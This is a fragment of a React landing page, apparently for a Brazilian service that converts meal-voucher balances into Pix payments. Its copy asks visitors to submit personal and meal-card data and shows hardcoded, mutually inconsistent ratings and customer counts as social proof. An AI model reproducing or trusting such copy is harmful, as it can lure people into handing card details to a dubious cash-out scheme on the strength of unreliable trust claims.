            <Badge variant="outline" className="mb-4 text-emerald-400 border-emerald-400/30">
              COMO FUNCIONA
            </Badge>
            <h2 className="text-3xl md:text-4xl font-bold mb-4">Seu vale vira Pix em 4 passos simples</h2>
            <p className="text-emerald-200/60">Processo 100% online, rápido e sem burocracia</p>
          </div>

          <div className="grid md:grid-cols-4 gap-8">
            {[
              { 
                step: "1", 
                title: "Cadastro de Usuário", 
                desc: "Preencha seus dados pessoais e dados do cartão vale-refeição.",
                tag: "Dados Pessoais" 
              },
              { 
                step: "2", 
                title: "Solicitação em Análise", 
                desc: "Nossa equipe analisa sua solicitação. Aguarde o e-mail de confirmação.",
                tag: "Até 24 horas" 
              },
              { 
                step: "3", 
                title: "Verificação", 
                desc: "Convertevale verifica os dados e aprova sua solicitação.",
                tag: "Seguro" 
              },
              { 
                step: "4", 
                title: "Transferência Pix", 
                desc: "O valor convertido é enviado diretamente para sua chave Pix.",
                tag: "Na sua conta!" 
              }
            ].map((item, i) => (
              <div key={i} className="relative group">
                <div className="bg-emerald-900/40 p-8 rounded-2xl border border-emerald-800 hover:border-emerald-600 transition-colors h-full">
                  <div className="text-5xl font-black text-[#8eb200] mb-6 group-hover:text-[#ccff00] transition-colors">
                    0{item.step}
                  </div>
                  <h3 className="text-xl font-bold mb-3">{item.title}</h3>
                  <p className="text-emerald-100/60 text-sm leading-relaxed mb-6">
                    {item.desc}
                  </p>
                  <Badge className="bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
                    {item.tag}
                  </Badge>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Form Section */}
      <section className="py-24 -mt-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-12">
            <Badge className="mb-4 bg-emerald-100 text-emerald-700 border-none">SOLICITE SUA CONVERSÃO</Badge>
            <h2 className="text-3xl font-bold text-emerald-950 mb-4">Preencha o formulário para converter</h2>
            <div className="w-16 h-1 bg-emerald-600 mx-auto rounded-full" />
          </div>
          <ConversionForm />
        </div>
      </section>

      {/* Testimonials Section */}
      <section className="py-24 bg-emerald-50/50">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-16">
            <Badge className="mb-4 bg-emerald-100 text-emerald-700 border-none">CLIENTES SATISFEITOS</Badge>
            <h2 className="text-3xl font-bold text-emerald-950 mb-4">O que nossos clientes dizem</h2>
            <p className="text-gray-600">Milhares de pessoas já converteram seu vale com segurança e rapidez.</p>
          </div>

          <div className="flex flex-col md:flex-row items-center justify-center gap-12 mb-16">
            <div className="text-center">
              <div className="text-5xl font-black text-emerald-950 mb-2">4.9</div>
              <div className="flex gap-1 justify-center mb-2">
                {[...Array(5)].map((_, i) => <Star key={i} className="w-5 h-5 fill-emerald-500 text-emerald-500" />)}
              </div>
              <div className="text-sm text-gray-500">Nota geral baseada em avaliações</div>
            </div>
            <Separator orientation="vertical" className="hidden md:block h-20 bg-gray-200" />
            <div className="text-center">
              <div className="text-5xl font-black text-emerald-950 mb-2">+2.7k</div>
              <div className="text-sm text-gray-500 uppercase tracking-widest font-bold">Avaliações verificadas</div>
            </div>
          </div>

          <Testimonials />
          
          <div className="text-center mt-12">
            <p className="text-emerald-900 font-medium">
              <strong>+2.400 clientes satisfeitos</strong> já converteram seus vales. Seja o próximo!
            </p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-[#004e32] border-t border-emerald-900/30 py-16 text-white">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <div className="flex flex-col items-center justify-center gap-2 mb-8">
            <img src="https://i.ibb.co/WvVW1F2t/IMG-20260601-WA0005-removebg-preview-1.png" alt="Convertevale Logo" className="h-16 w-auto" />
          </div>
          <p className="text-emerald-100/60 text-sm mb-8">
            Transforme seu vale-refeição em Pix com total segurança e rapidez.
          </p>
          <div className="flex justify-center gap-8 text-sm font-medium text-emerald-100/80 mb-12">
            <a href="#" className="hover:text-white">Início</a>
            <a href="#" className="hover:text-white">Solicitar Conversão</a>
            <a href="#" className="hover:text-white">Privacidade</a>
          </div>
          <div className="text-xs text-emerald-100/40 space-y-2">
            <p>CNPJ: 34.351.180/0001-28</p>
            <p>© 2026 Convertevale. Todos os direitos reservados.</p>
          </div>
        </div>
      </footer>

      {/* Floating WhatsApp Button */}
      <div className="fixed bottom-6 right-6 z-50 flex flex-col items-end group">
        <div className="mb-2 bg-white px-3 py-1.5 rounded-lg shadow-lg border border-gray-100 opacity-0 group-hover:opacity-100 transition-opacity duration-300">
          <p className="text-[10px] font-bold text-gray-400 whitespace-nowrap">Precisa de ajuda?</p>
        </div>
        <a 
          href="https://wa.me/5500000000000" 
          target="_blank" 
          rel="noopener noreferrer"
          className="bg-[#25D366] text-white p-4 rounded-full shadow-2xl hover:scale-110 transition-transform duration-300 flex items-center justify-center"
        >
          <MessageCircle className="w-6 h-6 fill-white text-[#25D366]" />
        </a>
      </div>
    </div>
  );
}
